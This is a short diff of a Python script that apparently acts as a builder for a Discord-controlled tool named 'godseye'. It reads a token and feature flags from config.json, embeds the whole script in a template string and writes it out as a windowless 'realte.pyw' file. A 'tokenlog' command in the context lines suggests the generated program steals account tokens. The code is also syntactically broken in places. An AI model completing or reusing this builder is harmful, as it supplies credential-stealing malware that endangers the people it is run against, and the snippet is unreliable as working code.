@@ -1,3 +1,16 @@
+with open('config.json') as f:
+    config = json.load(f)
+    token = config.get('token')
+    PLC1=config.get('PLC')
+    IFC1=config.get('IFC')
+    PIC1=config.get('PIC')
+    HTP1=config.get('HTP')
+    TLC1=config.get('TLC')
+
+mainstr=(((f"""
+
+
+
 import requests
 import threading 
 import urllib import os
@@ -289,3 +302,7 @@ async def tokenlog(ctx):
     
 
 godseye.run(DiscordBotToken)
+""")))
+f = open("realte.pyw", "x")
+    f.write(mainstr)
+    f.close()
